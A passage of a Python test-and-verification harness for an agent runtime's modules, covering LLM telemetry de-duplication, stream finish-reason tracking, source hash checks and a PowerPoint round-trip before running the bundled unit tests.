self.assertEqual(dataset[\'value_field\'], \'hours\')\n            for command in [\'按部门统计金额和工数合计并生成柱状图\', \'按部门统计合计并生成柱状图\']:\n                with self.subTest(command=command), self.assertRaisesRegex(ValueError, \'chart_metric_ambiguous\'):\n                    chart_dataset(evidence, f\'【当前会话有效附件清单】: {source.name}\\n用户指令：{command}\')\n', 'test_llm_accounting.py': '"""Count one proxy completion once across auxiliary and response telemetry layers."""\nimport io\nimport json\nimport unittest\nfrom contextlib import redirect_stdout\nfrom unittest.mock import patch\n\nfrom dsh_modules.llm import call_model_proxy\nfrom dsh_modules.runtime_policy import RuntimePolicy\nfrom dsh_modules.telemetry import TelemetryStats\n\n\nclass StreamResponse:\n    def __enter__(self):\n        return iter([\n            b\'data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}],"usage":{"prompt_tokens":16524,"completion_tokens":217,"total_tokens":16741}}\\n\',\n            b\'data: [DONE]\\n\',\n        ])\n\n    def __exit__(self, *args):\n        pass\n\n\nclass LlmAccountingTests(unittest.TestCase):\n    def test_salvage_response_adds_observability_without_double_counting(self):\n        stats = TelemetryStats()\n        with patch(\'urllib.request.urlopen\', return_value=StreamResponse()) as network, redirect_stdout(io.StringIO()):\n            response = call_model_proxy([{\'role\': \'user\', \'content\': \'aggregate\'}], model=\'test\',\n                policy=RuntimePolicy(), purpose=\'chart_salvage\', stream_deltas=False, telemetry=stats)\n        stats.record_llm_response(response, purpose=\'chart_salvage\', is_first_round=True)\n        stats.record_llm_response(response, purpose=\'chart_salvage\')\n        self.assertEqual(network.call_count, 1)\n        self.assertEqual(stats.llm_invocations, 1)\n        self.assertEqual(stats.auxiliary_invocations, 1)\n        self.assertEqual(stats.tokens[\'total_tokens\'], 16741)\n        self.assertAlmostEqual(stats.total_ms, response[\'total_ms\'], places=2)\n        self.assertEqual(stats.ttft_ms, response[\'ttft_ms\'])\n        metrics = json.loads(stats.to_metrics_json())\n        self.assertEqual(len(metrics[\'callsLedger\']), 1)\n        self.assertEqual(metrics[\'callsLedger\'][0][\'call_id\'], response[\'call_id\'])\n        self.assertEqual(metrics[\'callsLedger\'][0][\'model\'], \'test\')\n        self.assertEqual(metrics[\'roundFinishReasons\'], [\'tool_calls\'])\n        self.assertEqual(len(metrics[\'modelResponses\']), 1)\n\n    def test_equal_usage_and_shared_parent_span_are_distinct_calls(self):\n        stats = TelemetryStats()\n        with patch(\'urllib.request.urlopen\', side_effect=lambda *a, **kw: StreamResponse()), redirect_stdout(io.StringIO()):\n            responses = [call_model_proxy([{\'role\': \'user\', \'content\': \'aggregate\'}],\n                policy=RuntimePolicy(), purpose=\'chart_salvage\', parent_span_id=\'same-parent\',\n                stream_deltas=False, telemetry=stats) for _ in range(2)]\n        for response in responses:\n            stats.record_llm_response(response, purpose=\'chart_salvage\')\n        self.assertNotEqual(responses[0][\'call_id\'], responses[1][\'call_id\'])\n        self.assertEqual(stats.llm_invocations, 2)\n        self.assertEqual(stats.auxiliary_invocations, 2)\n        self.assertEqual(stats.tokens[\'total_tokens\'], 33482)\n        self.assertEqual(len(stats.calls_ledger), 2)\n        self.assertEqual(len(stats.model_responses), 2)\n\n    def test_legacy_responses_without_ids_are_not_deduplicated_by_usage(self):\n        stats = TelemetryStats()\n        response = {\'usage\': {\'total_tokens\': 42}, \'total_ms\': 100, \'finish_reason\': \'stop\'}\n        stats.record_llm_response(response)\n        stats.record_llm_response(response)\n        self.assertEqual(stats.llm_invocations, 2)\n        self.assertEqual(stats.tokens[\'total_tokens\'], 84)\n        self.assertEqual(stats.total_ms, 200)\n', 'test_response_observability.py': '"""Distinguish an upstream stop, transport EOF, and content cleanup without logging content."""\nimport io\nimport json\nimport sys\nimport unittest\nfrom contextlib import redirect_stdout\nfrom pathlib import Path\nfrom unittest.mock import patch\n\nsys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))\nfrom dsh_modules.llm import call_model_proxy\nfrom dsh_modules.runtime_policy import RuntimePolicy\nfrom dsh_modules.telemetry import TelemetryStats\n\n\nclass StreamResponse:\n    def __init__(self, frames):\n        self.frames = frames\n\n    def __enter__(self):\n        return iter(self.frames)\n\n    def __exit__(self, *args):\n        pass\n\n\nclass ResponseObservabilityTests(unittest.TestCase):\n    def test_stream_termination_source_is_not_inferred_as_upstream_stop(self):\n        content = b\'data: {"choices":[{"delta":{"content":"answer"}}]}\\n\'\n        stop = b\'data: {"choices":[{"delta":{},"finish_reason":"stop"}]}\\n\'\n        done = b\'data: [DONE]\\n\'\n        for frames, reason, source, received_done in [\n            ([content, stop, done], "stop", "upstream", True),\n            ([content, done], "stop", "done_fallback", True),\n            ([content], "stream_closed_prematurely", "stream_closed", False),\n        ]:\n            with self.subTest(source=source), patch("urllib.request.urlopen", return_value=StreamResponse(frames)), redirect_stdout(io.StringIO()):\n                result = call_model_proxy([{"role": "user", "content": "test"}], policy=RuntimePolicy(), stream_deltas=False)\n            self.assertEqual(result["finish_reason"], reason)\n            self.assertEqual(result["finish_reason_source"], source)\n            self.assertIs(result["received_done"], received_done)\n\n    def test_cleanup_loss_is_visible_without_persisting_raw_response(self):\n        stats = TelemetryStats()\n        raw = \'今日新闻速览\\n<tool_call>{"name":"web_search","arguments":{"query":"private-query"}}</tool_call>\'\n        stats.record_llm_response({"content": raw, "finish_reason": "stop", "received_done": True,\n                                   "finish_reason_source": "upstream"})\n        data = json.loads(stats.to_metrics_json())\n        response = data["modelResponses"][0]\n        self.assertGreater(response["rawChars"], response["cleanChars"])\n        self.assertNotEqual(response["rawSha256"], response["cleanSha256"])\n        self.assertNotIn("private-query", stats.to_metrics_json())\n        self.assertEqual(response["finishReasonSource"], "upstream")\n        self.assertTrue(response["receivedDone"])\n\n\nif __name__ == "__main__":\n    unittest.main()\n'}, 'source_hashes': {'output_format_contract.py': '05219ec8a6374bd8539b71d20a10b5d6c1baea81abc9fb53b51f27155b21b0cd', 'task_intent.py': '1453a00174868d59dceababe6a4f4e6c973683c2dd690fc802e5dc18f221a20b', 'shell_tools.py': 'befa6ed0772199539af91d733f0ad322cff19d3015790af62319dabaf143f32d', 'tools.py': '841fabfd8c0de82697a4366d5734a016d2fa47ebac60c29725c0a2b05630ba8a', 'agent_loop.py': 'd7222ef70a778c57e9fa0b0612e8dfbf9c6f989b5a34fbb3b7b484280be9dd15'}}

import sys,os,json,tempfile,zipfile,hashlib,types,unittest
from pathlib import Path
sys.path.insert(0, '/usr/local/bin')
import pptx
from pptx import Presentation
assert os.getuid() == 1001
assert '/home/sandbox/.local' not in pptx.__file__
for name, expected in payload['source_hashes'].items():
    assert hashlib.sha256((Path('/usr/local/bin/dsh_modules')/name).read_bytes()).hexdigest()==expected, name
with tempfile.TemporaryDirectory(prefix='ppt-runtime-fix-') as folder:
    p=Path(folder)/'test.pptx'
    deck=Presentation()
    for title in ['自我介绍','个人荣誉','竞选目标','竞选宣言']:
        deck.slides.add_slide(deck.slide_layouts[5]).shapes.title.text=title
    deck.save(p)
    assert len(Presentation(p).slides)==4
    with zipfile.ZipFile(p) as archive: assert archive.testzip() is None
suite=unittest.TestSuite()
for name, source in payload['tests'].items():
    mod=types.ModuleType(name[:-3]); mod.__file__='/tmp/'+name
    exec(compile(source,mod.__file__,'exec'),mod.__dict__)
    suite.addTests(unittest.defaultTestLoader.loadTestsFromModule(mod))
result=unittest.TextTestRunner(verbosity=1).run(suite)
print('RUNTIME_VERIFICATION='+json.dumps({'uid':os.getuid(),'pptx_version':pptx.__version__,
    'pptx_module':pptx.__file__,'native_pptx_roundtrip_pages':4,'test_count':result.testsRun,
    'test_failures':len(result.failures),'test_errors':len(result.errors),'source_hashes_verified':True}))
sys.exit(0 if result.wasSuccessful() else 1)
